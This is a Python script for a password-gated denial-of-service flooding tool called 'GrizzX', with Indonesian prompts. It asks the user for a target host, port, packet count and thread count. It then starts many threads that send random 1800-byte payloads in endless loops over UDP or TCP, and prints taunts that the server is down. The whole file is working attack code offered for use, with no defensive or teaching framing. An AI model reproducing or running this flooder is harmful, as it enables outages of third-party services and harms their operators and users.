import time
import random
import socket
import threading
import os

os.system("clear")
password ="GrizzXDDoS"

for i in range(3):
	pwd = input("[>] PASSWORD: ")
	j=3
	if(pwd==password):
		time.sleep(5)
		print("[>] TUNGGU 5 DETIK!!! ")
		break
	else:
		time.sleep(5)
		print("[×] Password Salah!!! ")
		continue
time.sleep(5)
print("[+] Password Benar Silahkan Ddos")
time.sleep(5)

print("===>> DDOS ATTACK GRZZX <<===")
print("""
░██████╗░██████╗░██╗███████╗███████╗██╗░░██╗
██╔════╝░██╔══██╗██║╚════██║╚════██║╚██╗██╔╝
██║░░██╗░██████╔╝██║░░███╔═╝░░███╔═╝░╚███╔╝░
██║░░╚██╗██╔══██╗██║██╔══╝░░██╔══╝░░░██╔██╗░
╚██████╔╝██║░░██║██║███████╗███████╗██╔╝╚██╗
░╚═════╝░╚═╝░░╚═╝╚═╝╚══════╝╚══════╝╚═╝░░╚═╝""")

ip = str(input("HOST/IP TARGET:"))
port = int(input("PORT TARGET:"))
choice = str(input("GASS BRO SERANG?(y/n):"))
times = int(input("PACKETS DDOS:"))
threads = int(input("THREADS DDOS:"))
def run():
	data = random._urandom(1800)
	i = random.choice(("[+]","[+]","[+]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Send Packet To Server By GrizzX!!!")
		except:
			print("[!] Mampus Udh Down!!!")

def run2():
	data = random._urandom(1800)
	i = random.choice(("[+]","[+]","[+]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Send Packet To Server By GrizzX!!!")
		except:
			s.close()
			print("[*] Mampus Udh Down")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
